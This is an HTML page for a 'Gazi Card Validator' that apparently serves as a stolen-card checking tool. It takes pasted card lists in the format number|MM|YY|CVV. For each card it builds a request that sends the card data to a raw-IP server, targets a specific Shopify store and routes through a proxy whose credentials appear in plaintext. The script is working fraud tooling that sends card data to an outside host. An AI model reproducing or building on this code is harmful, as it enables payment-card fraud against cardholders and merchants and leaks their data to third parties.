<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="preconnect" href="http://108.165.12.183:8081">
    
    <title>Gazi Card Validator | Ultra Pro</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --primary: #007AFF;
            --success: #34C759;
            --danger: #FF3B30;
            --bg: #0A0A0C;
            --glass: rgba(255, 255, 255, 0.08);
            --card-text: #E5E5EA;
        }

        * {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg);
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            overflow-x: hidden;
        }

        /* Animated Liquid Background */
        .liquid-bg {
            position: fixed;
            width: 100vw; height: 100vh;
            top: 0; left: 0; z-index: -1;
            overflow: hidden;
        }
        .blob {
            position: absolute;
            width: 300px; height: 300px;
            background: radial-gradient(circle, var(--primary), transparent 70%);
            filter: blur(80px);
            opacity: 0.4;
            animation: move 15s infinite alternate ease-in-out;
        }
        @keyframes move {
            from { transform: translate(-10%, -10%); }
            to { transform: translate(30%, 20%); }
        }

        .app-container {
            width: 100%;
            max-width: 460px;
            padding: 24px;
            display: flex;
            flex-direction: column;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 26px;
            font-weight: 800;
            letter-spacing: -0.5px;
            margin: 0;
            background: linear-gradient(135deg, #fff 0%, #007AFF 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .header p {
            color: #8E8E93;
            font-size: 13px;
            margin-top: 6px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        /* Input Card Design */
        .main-card {
            background: var(--glass);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 30px;
            padding: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }

        textarea {
            width: 100%;
            height: 150px;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            color: #00D2FF;
            padding: 15px;
            font-family: 'SF Mono', 'Fira Code', monospace;
            font-size: 14px;
            resize: none;
            outline: none;
            transition: 0.3s;
        }

        textarea:focus {
            border-color: var(--primary);
            box-shadow: 0 0 15px rgba(0, 122, 255, 0.2);
        }

        .validate-btn {
            width: 100%;
            padding: 18px;
            background: var(--primary);
            color: #fff;
            border: none;
            border-radius: 20px;
            font-size: 16px;
            font-weight: 700;
            margin-top: 15px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            transition: 0.3s;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.02); }
            100% { transform: scale(1); }
        }

        .validate-btn:active {
            transform: scale(0.96);
        }

        /* Result Animation */
        #results {
            margin-top: 25px;
            padding-bottom: 120px;
        }

        .result-item {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 20px;
            padding: 15px 18px;
            margin-bottom: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            opacity: 0;
            animation: bounceIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55) forwards;
        }

        @keyframes bounceIn {
            from { opacity: 0; transform: scale(0.8); }
            to { opacity: 1; transform: scale(1); }
        }

        .card-details {
            font-size: 14px;
            color: var(--card-text);
            font-weight: 500;
        }

        .check-btn {
            background: #fff;
            color: #000;
            border: none;
            padding: 10px 20px;
            border-radius: 14px;
            font-weight: 700;
            font-size: 12px;
            text-transform: uppercase;
            cursor: pointer;
        }

        /* Footer Branding */
        .footer {
            margin-top: auto;
            text-align: center;
            padding: 24px;
        }

        .footer-badge {
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 15px 25px;
            border-radius: 25px;
            display: inline-block;
        }

        .footer-badge span {
            font-size: 11px;
            color: #8e8e93;
            display: block;
            margin-bottom: 4px;
        }

        .footer-badge b {
            font-size: 15px;
            color: #fff;
            letter-spacing: 0.5px;
        }

        .tg-link {
            color: var(--primary);
            text-decoration: none;
            font-size: 12px;
            font-weight: 700;
            display: block;
            margin-top: 8px;
        }
    </style>
</head>
<body>

    <div class="liquid-bg">
        <div class="blob"></div>
    </div>

    <div class="app-container">
        <header class="header">
            <h1>GAZI CARD VALIDATOR</h1>
            <p><i class="fa-solid fa-shield-check"></i> High Speed System (Ultra Pro)</p>
        </header>

        <main class="main-card">
            <textarea id="cardInput" placeholder="Enter Card List (Format: XXXX|MM|YY|CVV)"></textarea>
            <button class="validate-btn" onclick="startCheck()">
                <i class="fa-solid fa-microchip"></i> START VALIDATION
            </button>
        </main>

        <div id="results"></div>

        <footer class="footer">
            <div class="footer-badge">
                <span>SYSTEM DEVELOPER</span>
                <b>RAHMAN GAZI</b>
                <a href="https://t.me/Rahman_Gazi" class="tg-link">
                    <i class="fa-brands fa-telegram-plane"></i> @Rahman_Gazi
                </a>
            </div>
        </footer>
    </div>

    <script>
        function startCheck() {
            const baseUrl = "http://108.165.12.183:8081/?";
            const suffix = "&url=https://customsbyarrillc.myshopify.com&proxy=ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2";
            
            const input = document.getElementById('cardInput').value.trim();
            const resultsDiv = document.getElementById('results');
            
            if(!input) return alert("Please input cards for validation!");

            resultsDiv.innerHTML = "";
            const lines = input.split(/\n/);

            lines.forEach((line, i) => {
                const card = line.trim();
                if(card.length > 5) {
                    const finalUrl = baseUrl + card + suffix;
                    const div = document.createElement('div');
                    div.className = 'result-item';
                    div.style.animationDelay = (i * 0.1) + 's';
                    div.innerHTML = `
                        <div class="card-details"><i class="fa-solid fa-credit-card"></i> ${card}</div>
                        <button class="check-btn" onclick="openValidator('${finalUrl}')">
                            <i class="fa-solid fa-magnifying-glass"></i> CHECK
                        </button>
                    `;
                    resultsDiv.appendChild(div);
                }
            });
        }

        function openValidator(url) {
            window.location.href = url;
        }
    </script>
</body>
</html>
